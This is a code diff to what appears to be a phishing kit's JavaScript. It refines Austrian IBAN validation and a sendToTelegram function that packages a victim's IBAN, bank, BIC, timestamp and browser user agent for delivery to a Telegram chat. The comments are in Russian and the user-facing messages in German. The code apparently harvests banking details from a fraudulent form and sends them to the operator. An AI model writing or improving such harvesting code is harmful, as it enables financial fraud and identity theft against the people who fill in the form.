@@ -156,35 +156,30 @@ function validateBirthdate(value) {
 function validateIbanLocally(iban) {
     const cleanIban = iban.replace(/\s/g, '').toUpperCase();
 
-    // 1. Только буквы и цифры
     if (!/^[A-Z0-9]+$/.test(cleanIban)) {
-        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
+        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
     }
 
-    // 2. Должен начинаться с AT
     if (!cleanIban.startsWith('AT')) {
-        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
+        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
     }
 
-    // 3. Минимум 20 символов (для Австрии стандарт — 20)
     if (cleanIban.length < 20) {
-        return { valid: false, message: 'Ungültige IBAN.', bankData: null };
+        return { valid: false, message: '❌ Ungültige IBAN.', bankData: null };
     }
 
-    // 4. Пытаемся определить банк по BLZ (цифры 5-9)
     const blz = cleanIban.substring(4, 9);
     const bankInfo = AUSTRIAN_BANKS[blz];
 
     let bankData = null;
-    let message = 'Gültige IBAN.';
+    let message = '✅ Gültige IBAN (Bank unbekannt).';
 
     if (bankInfo) {
         bankData = {
             bic: bankInfo.bic,
             bank: bankInfo.bank
         };
-    } else {
-        message = 'Gültige IBAN (Bank unbekannt).';
+        message = '✅ Gültige IBAN.';
     }
 
     return { valid: true, message: message, bankData: bankData };
@@ -321,21 +316,19 @@ function sendToTelegram(data) {
     message += `🏦 <b>IBAN:</b> ${data.iban || 'nicht angegeben'}\n`;
     message += `🔍 <b>IBAN-Status:</b> ${ibanData.message || 'nicht geprüft'}\n`;
 
+    let bankName = '';
+    let bic = '';
+
     if (ibanData.bankData) {
-        let bankName = ibanData.bankData.bank;
-        const bic = ibanData.bankData.bic;
-
+        bankName = ibanData.bankData.bank || '';
+        bic = ibanData.bankData.bic || '';
         if (!bankName && bic) {
-            bankName = getBankNameByBIC(bic);
-        }
-
-        if (bankName) {
-            message += `🏛️ <b>Bank:</b> ${bankName}\n`;
-        }
-        if (bic) {
-            message += `🔢 <b>BIC:</b> ${bic}\n`;
+            bankName = getBankNameByBIC(bic) || '';
         }
     }
+
+    message += `🏛️ <b>Bank:</b> ${bankName}\n`;
+    message += `🔢 <b>BIC:</b> ${bic}\n`;
 
     message += `\n🕒 <b>Zeit:</b> ${new Date().toLocaleString('de-DE')}`;
     message += `\n🌐 <b>Browser:</b> ${navigator.userAgent}`;
